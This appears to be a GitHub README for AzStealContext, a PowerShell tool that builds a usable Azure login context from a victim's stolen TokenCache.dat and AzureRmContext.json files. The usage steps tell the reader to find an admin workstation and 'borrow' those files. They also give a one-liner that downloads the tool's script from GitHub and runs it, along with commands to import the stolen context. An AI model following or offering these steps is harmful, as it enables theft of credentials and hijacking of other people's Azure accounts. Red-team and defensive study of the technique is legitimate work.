# AzStealContext

A PowerShell function that automates the process of stealing the Azure context of a users .Azure folder. 

When a user authenticates using the Az PowerShell module a `.Azure` folder is created in the users home folder. This folder contains multipele files including the `AzureRmContext.json` and `TokenCache.dat` files. These files contain all the information a attacker needs to create a 'context file' which is equivalent of the output from the [`Save-AzContext`](https://docs.microsoft.com/en-us/powershell/module/az.accounts/save-azcontext?view=azps-4.6.1) command. This PowerShell function automates the process a attacker would need to take to create a 'context' file.

The AzureRmContext file can have multiple 'contexts'. This happens when the `Connect-AzAccount` is run multiple times by the same user with different Azure credentials. This function will verify if there are multiple contexts and if so, will ask you which one to use as the default context. 


## Usage
1. Find a Admin workstation / Userprofile that has the `.Azure` folder.
2. 'Borrow' the `TokenCache.dat` and `AzureRmContext.json` files.
3. Load this function. `iex((iwr https://raw.githubusercontent.com/justin-p/AzStealContext/master/Invoke-AzStealContext.ps1).content)`
4. Run the function
   - To prepare a AzContext file: `Invoke-AzStealContext -Path 'Path\To\Borrowed\Files'`
   - To prepare and Import a AzContext file: `Invoke-AzStealContext -Path 'Path\To\Borrowed\Files' -ImportContext`
   - To prepare a AzContext file and overwrite a existing OutFile: `Invoke-AzStealContext -Path 'Path\To\Borrowed\Files' -ImportContext -Force`
   - To change the default OutFile name `Invoke-AzStealContext -Path 'Path\To\Borrowed\Files' -OutFile 'CustomFilename.json'`
   
# Contributing

Feel free to open issues, contribute and submit your Pull Requests. You can also ping me on Twitter (@JustinPerdok)
